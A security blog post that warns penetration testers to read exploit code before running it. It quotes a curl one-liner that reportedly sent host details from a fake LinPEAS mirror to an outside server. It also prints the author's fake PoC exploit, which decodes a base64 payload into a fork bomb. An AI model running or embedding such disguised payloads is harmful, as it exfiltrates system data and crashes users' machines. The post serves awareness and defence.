---
title: Read Before You Run
layout: post
image: "https://github.com/user-attachments/assets/b557e57a-6c9c-48e7-95e2-c3c3af623275"
author: "0xRar"
description: "Read the freaking code!, a post about how code literecy can also effect technical people."
tags:
- General
- OffSec
---

Hello hacker friends, today i wanted to talk to you all about something, offensive security operators/sys admins
still need to be careful of what they run, Let me tell you why.

A while ago i have noticed some fake Proof of Concept exploits on github that execute something other than what the 
vulnerabillity actually is e.g. apache version 2.xx.xx but the script is sending the content of `/home/user/.ssh/id_rsa`
to an attacker controlled server, which is the path to the secure shell(SSH) private key that can be used to connect 
remotely to the machine.

In the following sections i will show a few examples on how code literecy can be bad if the threat actor knew what to do.


## Fake LinPEAS Mirror

On Nov 27, 2024 someone by the name of [shadyeip] created a [github issue] on the original github repo
of LinPEAS (linux privilege escalation awesome scripts), reported that the the linpeas script hosted on
https://linpeas.sh/ is actually sending information about every linux machine it runs on using the following 
linux one liner.

```bash
curl -s "https://log.linpeas.sh/?uuid=$(cat /proc/sys/kernel/random/uuid)&id;=$(cat /var/lib/dbus/machine-id)&root;=$IAMROOT&hostname;=$(hostname)&user;=$(whoami)&uname;=$(uname -a | base64 -w 0)&cwd;=$(pwd | base64 -w 0)" > /dev/null 2>/dev/null
```
sends data such as:
- Machine ID
- Hostname
- Username
- Uname - to get all the information related to the Operating system on the host machine

Thankfully this whole thing appeared to be a reaseach project by the owner of the domain [hattonsec], and of course
this code will be really hard to analyze due to the size of the script.

The script was removed but you can find in: [Wayback Machine / Web Archive]

![Chillguy](https://github.com/user-attachments/assets/137b36cc-44ec-4333-ab0a-620b74c14c06)

[github issue]: https://github.com/peass-ng/PEASS-ng/issues/450
[shadyeip]: https://github.com/shadyeip
[hattonsec]: https://x.com/hattonsec
[Wayback Machine / Web Archive]: https://web.archive.org/web/20240902110620/https://linpeas.sh/

## A Simple fake PoC exploit made by me

For this example i made a simple a fake PoC written in python, lets say you are in a pentest and you found 
a vulnerable software running on the client's network, so you decide to go to github and look for an exploit
you find an exploit and you decide to clone it and run it without actually reading the code or understading 
what the vulnerabillity is.

"Exploit":
```python
import time
import distro
import subprocess

# A Proof of Concept privilege escalation exploit for ubuntu based hosts
# CVE: CVE-2025-0000
# Tested on: Ubuntu
# Author: 0xRar

def check_dist():
    if distro.id() == 'ubuntu':
        print('[+] Target is vulnerable.')
    else:
        print('[-] Target is not vulnerable :(')
        quit('Quitting... Try again next time')


def main():
    check_dist()
    print('[+] Getting the root shell ready for you !')
    time.sleep(5)

    # Executing the payload
    payload = 'OigpeyA6fDomIH07Og=='
    subprocess.run('id root', shell=True)
    subprocess.run(f'echo {payload} | base64 -d | bash', shell=True)


if __name__ == '__main__':
    main()
```

Despite the simplicity, if user does not decode the base64 they wouldn't know what it does, 
let me break it down

the code starts by creating a function `check_dist()` which checks if the target system distro is ubuntu
if that statement returns true it will print `[+] Target is vulnerable.` in order to trick the user in beliving its 
actually doing something moving on to the `main()` function; it goes on by running the `check_dist()` function,
sleeping and then initilizes a `payload` variable that decodes into a [fork bomb] `:(){ :|:& };:` and executes it.

whats a fork bomb? : in short a fork bomb is a defined function that calls it self and the pipes the result 
back into itself which will keep running as a background job because of the `&` creating an endless loop
of processes.

![fake poc](https://github.com/user-attachments/assets/755ff199-d5c2-4a6e-afaf-24341685e74b)

[fork bomb]: https://en.wikipedia.org/wiki/Fork_bomb


## Vibe Coding

Changing the topic one last time, vibe coding without actually understanding what the code is doing is even much worst
than you think, people actually started SaaS companies creating software and selling it and then realize their code base
is actually riddeld with vulnerabilities, AI for the most part is making something that works and thats about it, check
following real-life example: 

![VibeCoding](https://github.com/user-attachments/assets/ee9b3966-a14b-4474-b567-6276d5380deb)
image credits: [_zenman]

[_zenman]: https://x.com/_zenman

## Thank you for reading !

Thats it for this blog post thank you for reading, until next time.

Happy Hacking.
